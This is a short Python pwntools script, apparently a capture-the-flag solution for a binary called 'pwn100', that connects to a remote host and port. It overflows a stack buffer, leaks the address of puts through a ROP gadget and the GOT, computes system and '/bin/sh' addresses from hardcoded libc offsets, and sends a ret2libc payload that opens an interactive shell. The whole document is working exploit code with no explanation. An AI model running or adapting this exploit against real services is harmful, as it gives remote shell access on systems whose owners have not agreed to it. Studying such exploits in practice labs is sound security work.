from pwn import *
context.log_level = 'debug'
#sh=process('./pwn100')
elf = ELF('./pwn100')
sh=remote('111.198.29.45','30620')
main_addr = 0x4006b8
pop_rdi_ret = 0x400763
pay = 'a'*0x40+'bbbbbbbb'+p64(main_addr)
pay = pay.ljust(0xc8,'a')
sh.send(pay)
sh.recv()
sleep(0.1)
pay = 'a'*0x40+'bbbbbbbb'+p64(pop_rdi_ret)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(main_addr)
pay = pay.ljust(0xc8,'a')
sh.send(pay)
sh.recvuntil('bye~\n')
puts_addr = u64(sh.recvuntil('\n',drop=True).ljust(8,'\x00'))
print hex(puts_addr)
system_addr = puts_addr - 0x06f690 + 0x045390
binsh_addr = puts_addr - 0x06f690 + 0x18cd57
pay = 'a'*0x40+'bbbbbbbb'+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)
pay = pay.ljust(0xc8,'a')
sh.send(pay)


#gdb.attach(sh)
sh.interactive()
